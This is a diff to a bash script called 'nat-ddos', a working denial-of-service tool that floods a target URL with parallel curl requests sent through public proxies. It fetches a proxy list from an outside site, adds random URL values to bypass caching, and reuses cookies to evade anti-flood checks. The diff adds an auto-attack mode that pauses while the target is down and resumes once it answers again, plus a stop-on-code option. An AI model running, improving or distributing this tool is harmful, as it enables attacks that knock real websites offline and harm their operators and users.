@@ -5,11 +5,20 @@
 # .
 # ├── cookies/
 # ├── nat-ddos
-# └── proxylist.txt
+# └── proxy.txt
 #
 
 function getarg {
 	cat /dev/stdin | awk -F"--$1 " '{print $2}' | awk -F" " '{print $1}'
+}
+
+function checkstatus {
+	while true
+	do
+		sleep 10
+		local rescode=$(curl -I $* 2>/dev/null | grep "HTTP/" | awk -F" " '{print $2}')
+		[[ $rescode == 200 ]] && echo "[$(date)] Received HTTP $rescode. Attack will now continue." && return 0
+	done
 }
 
 function run {
@@ -22,6 +31,14 @@ function run {
 		done
 	[[ -z $nowait ]] && echo -e "\n[$(date)] Rest $rest second..." && sleep $rest || echo
 	[[ ! -z $killcurl ]] && killall -9 curl
+	[[ ! -z $autoattack || ! -z $stopcode ]] && local rescode=$(curl -I $* 2>/dev/null | grep "HTTP/" | awk -F" " '{print $2}')
+	[[ $stopcode == $rescode ]] && echo "[$(date)] Received HTTP $stopcode. Stopping attack now." && exit 0
+	[[ ! -z $autoattack ]] && {
+		[[ ! $rescode == 200 ]] && {
+			echo "[$(date)] Received HTTP $rescode. Attack paused."
+			checkstatus $*
+		}
+	}
 	done
 }
 
@@ -29,13 +46,13 @@ function attack {
 	for p in $(cat $list)
 	do
 			
-  	if [[ ! -z $read_cookie ]]
-		then 
-			[[ ! -e cookies/$p ]] && cookiestr="-c cookies/$p" || cookiestr="-b cookies/$p"
-		else
-			[[ ! -z $cookie_load ]] && cookiestr="-b $cookie_load"
-	fi
-	http_proxy=$p curl $(echo $* | sed -e "s/_RAND_/$RANDOM/g;") --max-time $timeout $cookiestr >> /dev/null 2> /dev/null &
+	  	if [[ ! -z $read_cookie ]]
+			then 
+				[[ ! -e cookies/$p ]] && cookiestr="-c cookies/$p" || cookiestr="-b cookies/$p"
+			else
+				[[ ! -z $cookie_load ]] && cookiestr="-b $cookie_load"
+		fi
+		http_proxy=$p curl $(echo $* | sed -e "s/_RAND_/$RANDOM/g;") --max-time $timeout $cookiestr >> /dev/null 2> /dev/null &
 	done
 }
 
@@ -51,31 +68,53 @@ function genloop {
 }
 
 function usage {
-	echo "usage: nat-ddos --url <target> [--proxys <proxy_list>]"
+	echo "usage: nat-ddos --url <target> [--proxys proxy_list]"
 	echo "                [--nowait] [--rest n] [--killcurl] [--thread n]"
 	echo "                [--load-cookies cookie] [--read-cookies]"
-	echo "                [--proxy-timeout n]"
+	echo "                [--proxy-timeout n] [--stop-code HTTP_CODE]"
+	echo "                [--autoattack]"
 	echo 
-	echo "if 'proxy_list' is not defined, will try to fetch one."
-	echo "use '_RAND_' in url to add random variable while attack (bypass chache)."
+	echo "OPTIONS:"
+	echo "  --url				: The url to attack."
+	echo "  --proxys <proxy_list>		: The path to the proxy list file."
+	echo "  --nowait			: Do not wait for curl to end before starting"
+	echo "  				  a new attack."
+	echo "  --rest n			: Wait for n second before starting a new"
+	echo "  				  attack."
+	echo "  --killcurl			: Kill curl after an around of attack."
+	echo "  --thread n			: Using n threads to attack."
+	echo "  --load-cookies cookie		: Load cookie from file."
+	echo "  --read-cookie			: Read cookie when attack, and load them during"
+	echo "  				  next time (bypass CC checker)."
+	echo "  --proxy-timeout n		: Set a curl timeout of n seconds."
+	echo "  --stop-code HTTP_CODE		: Stop attack when receive given HTTP_CODE from "
+	echo "  				  target."
+	echo "  --autoattack			: Pause attack when receive a non-200 code from"
+	echo "  				  target, and resume when receive 200."
+	echo
+	echo "NOTICE: "
+	echo "  if 'proxy_list' is not defined, will try to fetch one."
+	echo "  use '_RAND_' in url to add random variable while attack (bypass chache)."
 	exit 1
 }
 
-target=$(echo $* | getarg url)
-thread=$(echo $* | getarg thread)
-list=$(echo $* | getarg proxys)
-nowait=$(echo $* | grep nowait)
-rest=$(echo $* | getarg rest)
-killcurl=$(echo $* | grep killcurl)
-cookie_load=$(echo $* | getarg load-cookie)
+target=$(echo $*       | getarg url)
+thread=$(echo $*       | getarg thread)
+list=$(echo $*         | getarg proxys)
+nowait=$(echo $*       | grep nowait)
+rest=$(echo $*         | getarg rest)
+killcurl=$(echo $*     | grep killcurl)
+cookie_load=$(echo $*  | getarg load-cookie)
 read_cookies=$(echo $* | grep read-cookies)
-timeout=$(echo $* | getarg proxy-timeout)
+timeout=$(echo $*      | getarg proxy-timeout)
+stopcode=$(echo $*     | getarg stop-code)
+autoattack=$(echo $*   | grep autoattack)
 
-[[ -z $thread ]] && thread=5
+[[ -z $thread  ]] && thread=5
 [[ -z $timeout ]] && timeout=15
-[[ -z $rest ]] && rest=5
-[[ -z $target ]] && usage
-[[ -z $list ]] && {
+[[ -z $rest    ]] && rest=5
+[[ -z $target  ]] && usage
+[[ -z $list    ]] && {
 	echo "[$(date)] Fecthing proxys... "
 	curl http://txt.proxyspy.net/proxy.txt 2> /dev/null | grep : | awk -F" " '{print $1}' > proxy.txt
 	list=proxy.txt
